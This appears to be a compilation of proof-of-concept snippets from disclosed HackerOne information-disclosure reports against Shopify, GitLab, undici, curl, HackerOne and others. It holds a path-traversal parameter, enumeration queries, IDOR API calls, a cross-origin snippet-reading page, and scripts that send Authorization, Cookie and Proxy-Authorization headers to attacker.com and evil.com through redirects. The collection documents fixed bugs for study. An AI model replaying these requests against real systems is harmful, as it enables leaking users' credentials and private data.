X-CSRF-Token: <redacted>
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/directory?query█████████
Cookie: <redacted>
Connection: close
'''

and partial response was,
```

## #1584718 Information disclosure ( Google Sales Channel ) — shopify — $500 — None
Source: `hackerone/reports/2022/1584718.md` (https://hackerone.com/reports/1584718)

```
data-channel-id="70715703461"
data-user-email="VICTIMEMAIL@gmail.com"
```

## #509574 Invited team member can disclosure slack channels — security — $500 — Information Disclosure
Source: `hackerone/reports/2019/509574.md` (https://hackerone.com/reports/509574)

```
query{
  
  teams(where:{handle:{_eq:"hackeronetest_4hr1y"}}){
    edges{
      node{
        slack_pipelines{
          nodes{
            id
            descriptive_label
            team{
              handle
              slack_integration{
                channels{
                  name
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```
    edges{
      node{
        slack_pipelines{
          nodes{
            id
            descriptive_label
            team{
              handle
              slack_integration{
                channels{
                  name
                }
              }
            }
          }
        }
      }
    }
```

## #118688 File name and folder enumeration. — shopify — $500 — Information Disclosure
Source: `hackerone/reports/2016/118688.md` (https://hackerone.com/reports/118688)

```
GET /cube.csv?q=SHOW+quantity_count%2C+total_sales+BY+product_type%2C+vendor%2C+product_title%2C+variant_title+FROM+products+SINCE+2016-01-15+UNTIL+2016-02-25+ORDER+BY+total_sales+DESC&token=WyIxMTgzODk5NCIsIjIwMTYtMDItMjVUMDY6NDg6NDcrMDA6MDAiXQ%3D%3D--7509095354b03b43d192b051cf1a41bca6ad3b7b&handle=Gross+sales+by+product+title&roles%5B%5D=web&roles%5B%5D=pos_login&beta=&user_id=63589959&timezone=../../../etc/ HTTP/1.1
Host: reports-dashboard.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://derision-t.myshopify.com/admin/reports/sales_by_product
Cookie: x=x
Connection: close
```

```
HTTP/1.1 400 Bad Request
Server: nginx
Date: Thu, 25 Feb 2016 06:10:01 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 31
Connection: close
Access-Control-Allow-Methods: GET, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 86400
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=16070400; includeSubDomains
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-Xss-Protection: 1; mode=block

timezone (400): is a directory
```

```
GET /cube.csv?q=SHOW+quantity_count%2C+total_sales+BY+product_type%2C+vendor%2C+product_title%2C+variant_title+FROM+products+SINCE+2016-01-15+UNTIL+2016-02-25+ORDER+BY+total_sales+DESC&token=WyIxMTgzODk5NCIsIjIwMTYtMDItMjVUMDY6NDg6NDcrMDA6MDAiXQ%3D%3D--7509095354b03b43d192b051cf1a41bca6ad3b7b&handle=Gross+sales+by+product+title&roles%5B%5D=web&roles%5B%5D=pos_login&beta=&user_id=63589959&timezone=../../../etc/ HTTP/1.1
Host: reports-dashboard.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://derision-t.myshopify.com/admin/reports/sales_by_product
Cookie: x=x
Connection: close
'''

Response:
```

## #1551588 CVE-2022-27775: Bad local IPv6 connection reuse — ibb — $480 — Information Disclosure
Source: `hackerone/reports/2022/1551588.md` (https://hackerone.com/reports/1551588)

```
Listening on :: 9999
Connection received on somehost someport
GET /x HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*

GET /y HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*
```

```
GET /x HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*

GET /y HTTP/1.1
```

## #2451113 Proxy-Authorization header not cleared on cross-origin redirect in undici.request — ibb — $420 — Information Disclosure
Source: `hackerone/reports/2024/2451113.md` (https://hackerone.com/reports/2451113)

```
var undici = require('undici');

const {
    statusCode,
    headers,
    trailers,
    body
} = undici.request({
    method: 'GET',
    maxRedirections: 1,
    origin: "http://127.0.0.1/", 
    pathname: "",
    headers: {
        'content-type': 'application/json',
        'Cookie': 'secret Cookie',
        'Authorization': 'secret Authorization',
        'Proxy-Authorization': 'secret Proxy-Authorization',
        'x-auth-token': 'secret x-auth-token',
        'Host': 'test.cn'
    }
})
```

```
<?php
header("Location: http://a.com:2333");
?>
```

```
127.0.0.1   a.com
```

## #2390009 Proxy-Authorization header is not cleared in cross-domain redirect in undici — ibb — $405 — Information Disclosure
Source: `hackerone/reports/2024/2390009.md` (https://hackerone.com/reports/2390009)

```
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```

```
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})
```

## #2243710 Cookie headers are not cleared in cross-domain redirect in undici-fetch — ibb — $405 — Information Disclosure
Source: `hackerone/reports/2024/2243710.md` (https://hackerone.com/reports/2243710)

```
import { request } from 'undici'
const {
  statusCode,
  headers,
  trailers,
  body
} = await request('http://anysite.com/redirect.php?url=http://attacker:8182',{
        maxRedirections: 3,
        headers: {
            autHorization: 'test',
	    cookie: "ddd=dddd"
        }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
  console.log('data', data)
}
```

```
import { fetch } from 'undici'

const res = await fetch('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
        maxRedirections: 3,
        headers: {
            AutHorization: 'test',
            Cookie: "ddd=dddd"
        }})
const json = await res.json()
console.log(json)
```

```
        maxRedirections: 3,
        headers: {
            autHorization: 'test',
```

## #348443 Snippet JS template allows attacker to read a user's private snippets — gitlab — $300 — Information Disclosure
Source: `hackerone/reports/2019/348443.md` (https://hackerone.com/reports/348443)

```
  - if public_snippet?
    .embed-snippet
      .input-group
        .input-group-btn
          %button.btn.embed-toggle{ 'data-toggle': 'dropdown', type: 'button' }
            %span.js-embed-action= _("Embed")
            = sprite_icon('angle-down', size: 12)
          %ul.dropdown-menu.dropdown-menu-selectable.embed-toggle-list
```

```
<html>
<head>
<style>
.gitlab-embed-snippets {
  display: none;
}
</style>
<script src="https://gitlab.com/snippets/1714319.js"></script>
</head>
<body>
  <script>
    alert(document.getElementById('LC1').innerHTML);
  </script>
</body>
</html>
```

```
    .embed-snippet
      .input-group
        .input-group-btn
          %button.btn.embed-toggle{ 'data-toggle': 'dropdown', type: 'button' }
            %span.js-embed-action= _("Embed")
            = sprite_icon('angle-down', size: 12)
          %ul.dropdown-menu.dropdown-menu-selectable.embed-toggle-list
```

## #318399 Program profile_metrics.json contains time to triage for deptofdefense even it's turned off — security — $250 — Information Disclosure
Source: `hackerone/reports/2018/318399.md` (https://hackerone.com/reports/318399)

```
>2) However, the program US dept of defense doesn't have profile metrics which we can't display any certain info.
But, still profile_metrics.json leaks the 
```

```
#Step to Reproduce

1) Go To 
```

```
2)Note: you can see there is no response efficiency.

3) Now, use the profile_metrics.json at the end of program parameter.

https://hackerone.com/deptofdefense/profile_metrics.json

4) The response is 

{"mean_time_to_first_response":null,
```

## #1072893 Sensitive information disclosure to shared access user via streamlabs platform api — logitech — $200 — Information Disclosure
Source: `hackerone/reports/2021/1072893.md` (https://hackerone.com/reports/1072893)

```
    https://streamlabs.com/dashboard#/settings/shared-access
```

```
    https://platform.streamlabs.com/api/v1/s/user/me
```

```
     
    https://streamlabs.com/api/v5/user/
```

## #302651 Leak of Platform Authentication credentials via Repeater — portswigger — $200 — Information Disclosure
Source: `hackerone/reports/2018/302651.md` (https://hackerone.com/reports/302651)

```
GET /redirect.php?url=http://evil.com HTTP/1.1
Host: example.com

 
```

```
GET http://evil.com/ HTTP/1.1
Host: evil.com
Authorization: Basic dXNlcjpwYXNz
```

## #162822 Fetch private list metadata and any user's personal name — instacart — $150 — Information Disclosure
Source: `hackerone/reports/2016/162822.md` (https://hackerone.com/reports/162822)

```
    POST /api/v2/lists/10/star_toggle
    
    {
      "meta": {
        "code": 200
      },
      "data": {
        "id": 10,
        "name": "Test",
        "description": "This is the description of a shopping list",
        "user_id": 10,
        "visible": false,
        ...
        "user_name": "Apoorva M",
        ...
      }
    
```

```
GET /api/v2/lists?user_id=10

{"meta":{"code":200,"author_name":"Apoorva M"},"data":[],"pagination":{"total":0,"per_page":0,"page":1}}
```

```
    '''
    POST /api/v2/lists/10/star_toggle
```

